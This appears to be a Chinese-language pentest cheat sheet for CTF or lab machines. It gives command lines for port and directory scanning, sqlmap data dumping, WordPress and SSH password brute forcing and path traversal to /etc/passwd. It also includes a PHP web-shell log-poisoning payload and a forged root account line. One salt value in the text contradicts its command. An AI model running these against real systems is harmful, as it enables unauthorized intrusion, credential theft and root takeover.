## Nmap
经典。扫描端口
```sh
nmap -p- -A -sC -sV 192.168.1.1 -VV -T5 //nmap常规扫描

sudo nmap -sU -sV -vv -oA quick_udp 192.168.200.149 //UDP扫描

sudo nmap -sS -sV -A -n 192.168.246.209

nmap -p 22 192.168.246.209 // 单扫端口
```

Host discovery
```sh
sudo nmap -sn 192.168.1.1/24
```

Connect Scan (TCP)
```sh
sudo nmap -sT <ip> -p- -A -Pn -v
```

SYN scan (TCP)
```sh
sudo nmap -sS <ip> -p- -A -Pn -v
```

UDP scan (UDP)
```sh
sudo nmap -sU <ip> -p- -A -Pn -v
```

Timing
```sh
sudo nmap ... -T0 # paranoid
sudo nmap ... -T1 # sneaky
sudo nmap ... -T2 # polite
sudo nmap ... -T3 # normal
```

Output
```sh
sudo nmap ... -oN scan
sudo nmap ... -oX scan
sudo nmap ... -oG scan
sudo nmap ... -oA scan
```

## Rustscan
扫描端口。***可能会扫漏，可以过几分钟再扫一次***
```sh
rustscan -a 192.168.152.72 --range 1-65535

rustscan -a 192.168.216.223 --range 1-65535 --ulimit 5000 -- -A
```
## Dirsearch
扫描目录。
```sh
dirsearch -u 192.168.216.223
```
## Dirb
扫描目录
```sh
dirb http://192.168.216.223 /usr/share/wordlists/dirb/big.txt
```
## Gobuster
扫描目录
```shell
gobuster dir -u 192.168.232.72:8593 -w /usr/share/wordlists/dirb/big.txt --no-error
```

中级字典，加上 `.zip` 后缀
```shell
gobuster dir -u http://192.168.237.219 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip
```
## Sqlmap
```sh
sqlmap -u http://192.168.152.72:8593/index.php?book=list
```

## Curl
查看响应头
```sh
curl -I 192.168.152.72
```

修改 UA (User-Agent)
```sh
sudo curl -s --user-agent GoogleBot http://192.168.225.14/robots.txt -v
```

`-v` verbose ，显示详细内容

发送 POST 请求
```sh
curl -X POST "http://139.224.130.183:32960/" -d "c=1024abc"
```

设置 Cookie
```sh
curl -b "session_id=123456" https://example.com
```

用 curl 修改X-Forwarded-For头
```sh
curl -H "X-Forwarded-For: 123.45.67.89" http://example.com
```

修改 Referer 头
```sh
curl -H "Referer: http://example.com" http://example.org
```
## Nc
`nc` 传小马，配合日志投毒
```sh
nc 192.168.218.72 80

GET /<?php system($_GET['cmd']); ?>
```

`nc`监听端口 4444
```sh
nc -nvlp 4444
```
## Wpscan
一款专门用来检测 CMS `Wordpress` 的软件

枚举用户名
```sh
wpscan --url http://loly.lc/wordpress/ --enumerate u
```

根据用户名爆破密码
```sh
wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
```

枚举用户名，插件，再进行密码爆破
```sh
wpscan --url http://funbox.fritz.box/ -e ap,u  --passwords /usr/share/wordlists/rockyou.txt
```

枚举(enumerate)插件(plugin)，主题(theme)，用户(user)
```sh
wpscan --url http://dc-2 -e p,t,u
```
## Cewl
Collect wordlist

抓取网站内容，提取出其中的单词，放入 `passwd` 文件中，如果没有这个文件，就创建。一般递归深度为 2 ，即抓取网站首页及链接的页面
```sh
cewl http://dc-2/ > password
```
## Sqlmap
POST 传参注入
用 `bp` 将请求包抓下来，然后
```sh
sqlmap -r search.txt
```

爆库
```sh
sqlmap -r search.txt --dbs
```

爆表
```sh
sqlmap -r search.txt -D <database> --tables
```

爆字段
```sh
sqlmap -r search.txt -D <database> -T <table> --columns
```

爆数据
```sh
sqlmap -r search.txt -D <database> -T <table> -C <column1,column2> --dump-all
```
## Wfuzz
```sh
wfuzz --hh 1341 -b "PHPSESSID=v83ig9f6u10pc2h1ht8cvvrn76" -c -w /usr/share/ wordlists/wfuzz/general/common.txt http://192.168.246.209/manage.php?FUZZ =../../../../../../../../etc/passwd
```
## Hydra
曾经有过扫不出来的经历。。。
```sh
hydra -L username.txt -P passwd.txt ssh://192.168.84.130
```
## Find
```sh
find / -name test.py 2>/dev/null 
```
## Openssl
通常用于创建 `/etc/passwd` 文件中存储的加密密码。
```sh
openssl passwd -1 -salt passion 123456
```
这条命令将输出一个使用 MD5 加密并带有盐值 `haruhi` 的加密密码。输出的格式通常是
这种生成的加密密码可以用在一些系统认证配置中，例如 Linux 系统的 `/etc/shadow` 文件中保存用户的密码信息。
配合 `/etc/passwd` 食用更佳
```sh
echo 'passion:$1$passion$6B1Neow110enwwaaEaWQs.:0:0::/root:/bin/bash' > passion
```

